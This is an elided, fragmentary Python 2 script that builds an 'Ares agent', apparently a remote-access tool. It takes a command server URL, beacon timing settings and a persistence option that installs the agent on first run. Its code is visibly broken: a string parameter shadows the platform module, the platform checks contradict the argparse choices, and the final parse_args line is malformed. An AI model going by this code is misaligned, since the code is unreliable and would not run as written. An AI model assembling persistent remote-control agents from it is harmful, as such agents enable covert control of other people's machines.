...
def build_agent(output, server_url, platform, hello_interval, idle_time, max_failed_connections, persist):
    ...
    if platform not in ['linux', 'windows']:
        ...
        exit(1)
    if platform == 'linux' and not platform.is_linux():
        print "[!] Can only build Linux agents on Linux. Please use a Linux platform."
        exit(0)
...
parser.add_argument('-p', '--platform', required=True, choices=['Windows', 'Linux'], help="Target platform (Windows, Linux).")
...
parser.add_argument('--persist', action='store_true', help="Automatically install the agent on first run.")
args = parser.parse_args()(description="Builds an Ares agent.")
